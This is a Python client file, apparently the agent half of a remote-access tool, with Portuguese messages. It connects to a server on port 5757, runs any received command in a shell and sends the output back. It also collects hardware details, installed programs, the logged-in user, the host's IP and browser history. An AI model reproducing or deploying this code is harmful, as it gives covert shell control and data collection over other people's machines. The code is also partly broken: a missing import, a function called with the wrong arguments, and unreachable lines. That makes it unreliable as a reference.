import socket
import subprocess
import os
from def_win import *
from def_lin import *
from browser_history.browsers import Chrome, Edge, Firefox

SO = platform.system()

def connect_to_server():
    server_host = '127.0.0.1'
    server_port = 5757  
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_host, server_port))

    while True:
        command = client.recv(1024).decode('utf-8')
        if command == 'exit':
            break    
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
        except subprocess.CalledProcessError as e:
            output = str(e.output)
        client.send(output)

        msg = client.recv(1024).decode('utf-8')
        if msg.strip() == '':
            print('\nNão foi possível permanecer conectado no servidor!\n')
            client.close()
            return
        try:
            if platform.system() == 'Windows':
                function_output = criar_respostaW(msg)
            else:
                function_output = criar_respostaL(msg)
        except Exception as e: 
            print(f"Erro: {e}")
            function_output = 'Erro ao executar o comando'

        print(function_output)
        client.send(f'{function_output}'.encode('utf-8'))

    client.close()

def criar_respostaW(comando):
    dictopcoes = {
        '/info_h': informacoes_hardwareW(),
        '/info_p': lista_programas_instaladosW(),
        '/info_u': informacoes_usuario_logadoW(),
        '/historic': historico_navegacaoW(),
        '/listclient': lista_agentes_onlineW()
    }

    try:
        return dictopcoes[comando]
    except: 
        return 'comando inválido'


def criar_respostaL(comando):
    dictopcoes = {
        '/info_h': informacoes_hardwareL(),
        '/info_p': lista_programas_instaladosL(),
        '/info_u': informacoes_usuario_logadoL(),
        '/historic': historico_navegacaoL(),
        '/listclient': lista_agentes_onlineL()
    }

    try:
        return dictopcoes[comando]
    except: 
        return 'comando inválido'


if SO == 'Linux':
    from def_lin import *

    def informacoes_hardwareL():
        informacoes = infohardwareL()
        return informacoes 

    def lista_programas_instaladosL():
        informacoes = proglinux()
        return informacoes

    def historico_navegacaoL(navegador):
        return "Histórico de navegação em diferentes navegadores."

    def informacoes_usuario_logadoL():
        informacoes = ipagentes()
        return informacoes

    def lista_agentes_onlineL():
        return "Lista dos agentes online com informações básicas."

elif SO == 'Windows':
    from def_win import *

    def informacoes_hardwareW():
        return infohardwareW()

    def lista_programas_instaladosW():
        return progwindows()

    def historico_navegacaoW():
        return 'históricos de navegação'

    def informacoes_usuario_logadoW():
        return ipagentes()

    def lista_agentes_onlineW():
        return "Lista dos agentes online com informações básicas."


def ipagentes():
    try:
        informacoes_agente = f'''
        ---- INFORMAÇÕES DO AGENTE ----

        Nome do host: {socket.gethostname()}
        Usuário logado: {os.getlogin()}
        IP do Host: {socket.gethostbyname(socket.gethostname())}
        '''
        return informacoes_agente
    except:
        return 'Não foi possível obter as informações do Agente'

    client.close()

if __name__ == "__main__":
    connect_to_server()
